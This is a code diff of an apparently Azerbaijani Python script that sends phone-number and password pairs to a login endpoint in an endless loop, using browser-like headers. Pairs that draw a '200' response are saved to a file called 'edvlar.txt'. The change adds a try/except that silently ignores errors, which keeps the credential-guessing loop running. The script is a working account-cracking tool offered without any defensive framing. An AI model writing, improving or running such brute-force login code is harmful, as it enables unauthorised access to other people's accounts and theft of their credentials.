@@ -1,4 +1,3 @@
-
 import requests
 import random
 import json
@@ -32,10 +31,13 @@ while True:
     "accept-language":"az",
     "connection":"keep-alive"
     }
-    p=(ses.post(url, headers=hea, data=json.dumps(datam)).json())
-    p=str(p)
-    if "200" in p:
-        print(nomre+":"+sifre)
-        open("edvlar.txt","a").write(nomre+":"+sifre)
-    else:
-     print("Xeta: "+nomre)
+    try:
+        p=(ses.post(url, headers=hea, data=json.dumps(datam)).json())
+        p=str(p)
+        if "200" in p:
+            print(nomre+":"+sifre)
+            open("edvlar.txt","a").write(nomre+":"+sifre)
+        else:
+         print("Xeta: "+nomre)
+    except:
+        pass
